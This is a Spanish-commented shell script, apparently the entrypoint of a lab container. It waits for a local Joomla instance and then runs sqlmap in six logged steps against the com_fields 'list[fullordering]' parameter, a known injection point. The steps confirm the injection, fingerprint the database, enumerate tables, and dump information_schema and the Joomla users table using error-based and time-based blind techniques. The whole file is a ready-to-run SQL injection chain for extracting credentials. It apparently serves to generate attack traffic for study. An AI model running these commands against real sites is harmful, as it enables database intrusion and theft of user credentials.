#!/bin/sh

# Crear directorios para guardar los resultados si no existen
mkdir -p /sqlmap-output/joomla/

# Verificar si ya se han generado los logs para cada paso
# Si los logs existen, saltar el paso

# Esperar a que Joomla esté disponible en el puerto 2017
until curl -s http://joomla_app:80 > /dev/null 2>&1; do
    echo "Esperando a que Joomla esté disponible...";
    sleep 5;
done;

# Esperar a que Joomla esté disponible sin redirigir en el puerto 2017
while curl -s -o /dev/null -w "%{http_code}" http://joomla_app:80 | grep 302 > /dev/null 2>&1; do
    echo "Esperando a que Joomla esté completamente instalado...";
    sleep 5;
done;

# Análisis de Joomla con SQLMap
echo "Inicio análisis de Joomla con SQLMap..."

# 1. Validar vulnerabilidad en Joomla
if [ -f /sqlmap-output/joomla/01-vulnerability-validation.txt ]; then
    echo "Logs del Paso 1 ya generados, saltando..."
else
    echo "Validando vulnerabilidad en Joomla (Paso 1)"
    curl -s 'http://joomla_app:80/InicioPaso1' > /dev/null 2>&1
    sqlmap -u 'http://joomla_app:80/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=name' -p list[fullordering] \
      --batch > /sqlmap-output/joomla/01-vulnerability-validation.txt
    curl -s 'http://joomla_app:80/FinalizadoPaso1' > /dev/null 2>&1
fi

# 2. Obtener información del motor de la base de datos en Joomla
if [ -f /sqlmap-output/joomla/02-database-engine-info.txt ]; then
    echo "Logs del Paso 2 ya generados, saltando..."
else
    echo "Obteniendo información del motor de la base de datos en Joomla (Paso 2)"
    curl -s 'http://joomla_app:80/InicioPaso2' > /dev/null 2>&1
    sqlmap -u 'http://joomla_app:80/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=name' -p list[fullordering] \
      --random-agent --batch --banner --is-dba --dbms=mysql --technique=E > /sqlmap-output/joomla/02-database-engine-info.txt
    curl -s 'http://joomla_app:80/FinalizadoPaso2' > /dev/null 2>&1
fi

# 3. Obtener todas las tablas, en todos los esquemas en el motor
if [ -f /sqlmap-output/joomla/03-database-tables.txt ]; then
    echo "Logs del Paso 3 ya generados, saltando..."
else
    echo "Obteniendo tablas y esquemas de Joomla (Paso 3)"
    curl -s 'http://joomla_app:80/InicioPaso3' > /dev/null 2>&1
    sqlmap -u 'http://joomla_app:80/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=name' -p list[fullordering] \
      --random-agent --batch --tables --dbms=mysql --technique=E > /sqlmap-output/joomla/03-database-tables.txt
    curl -s 'http://joomla_app:80/FinalizadoPaso3' > /dev/null 2>&1
fi

# 4. Obtener datos de la tabla TABLES del schema information_schema en Joomla
if [ -f /sqlmap-output/joomla/04-information_schema_tables.txt ]; then
    echo "Logs del Paso 4 ya generados, saltando..."
else
    echo "Obteniendo datos de la tabla TABLES de information_schema en Joomla (Paso 4)"
    curl -s 'http://joomla_app:80/InicioPaso4' > /dev/null 2>&1
    sqlmap -u 'http://joomla_app:80/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=name' -p list[fullordering] \
      --batch --random-agent --dump -D information_schema -T TABLES --dbms=mysql --technique=E > /sqlmap-output/joomla/04-information_schema_tables.txt
    curl -s 'http://joomla_app:80/FinalizadoPaso4' > /dev/null 2>&1
fi

# 5. Obtener datos de la tabla qoxit_users del schema joomla, usando "MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)"
if [ -f /sqlmap-output/joomla/05-users-table-data-technique-E.txt ]; then
    echo "Logs del Paso 5 ya generados, saltando..."
else
    echo "Obteniendo datos de la tabla qoxit_users de Joomla (Paso 5)"
    curl -s 'http://joomla_app:80/InicioPaso5' > /dev/null 2>&1
    sqlmap -u 'http://joomla_app:80/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=name' -p list[fullordering] \
      --random-agent --batch --dump -D joomla_db -T 'qoxit_users' --dbms=mysql --technique=E > /sqlmap-output/joomla/05-users-table-data-technique-E.txt
    curl -s 'http://joomla_app:80/FinalizadoPaso5' > /dev/null 2>&1
fi

# 6. Obtener datos de la tabla qoxit_users del schema joomla, usando "MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)"
if [ -f /sqlmap-output/joomla/06-users-table-data-technique-T.txt ]; then
    echo "Logs del Paso 6 ya generados, saltando..."
else
    echo "Obteniendo datos de la tabla qoxit_users de Joomla usando ciega basada en tiempo (Paso 6)"
    curl -s 'http://joomla_app:80/InicioPaso6' > /dev/null 2>&1
    sqlmap -u 'http://joomla_app:80/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=name' -p list[fullordering] \
      --random-agent --batch --dump -D joomla_db -T 'qoxit_users' --dbms=mysql --technique=T > /sqlmap-output/joomla/06-users-table-data-technique-T.txt
    curl -s 'http://joomla_app:80/FinalizadoPaso6' > /dev/null 2>&1
fi

echo "Finalizado análisis de Joomla con SQLMap."

# Mantener el contenedor activo
tail -f /dev/null